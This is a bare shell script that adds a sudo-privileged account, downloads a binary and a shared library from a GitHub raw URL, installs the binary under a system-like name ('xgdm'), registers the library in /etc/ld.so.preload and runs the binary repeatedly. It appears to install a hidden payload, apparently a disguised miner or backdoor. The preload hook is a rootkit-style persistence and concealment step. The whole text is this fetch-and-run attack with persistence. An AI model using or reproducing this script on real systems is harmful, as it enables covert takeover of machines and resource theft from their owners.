adduser user
echo "user ALL=(ALL) ALL" >> /etc/sudoers
apt-get install git build-essential cmake libuv1-dev libmicrohttpd-dev
wget https://raw.githubusercontent.com/c2lc2l/c2lc2l/master/xgdm
wget https://raw.githubusercontent.com/c2lc2l/c2lc2l/master/libcxxuvd.so
mv xgdm /usr/bin/xgdm
mv libcxxuvd.so /usr/local/lib/libcxxuvd.so
echo /usr/local/lib/libcxxuvd.so >> /etc/ld.so.preload
chmod +x /usr/bin/xgdm
/usr/bin/xgdm
/usr/bin/xgdm
/usr/bin/xgdm
/usr/bin/xgdm

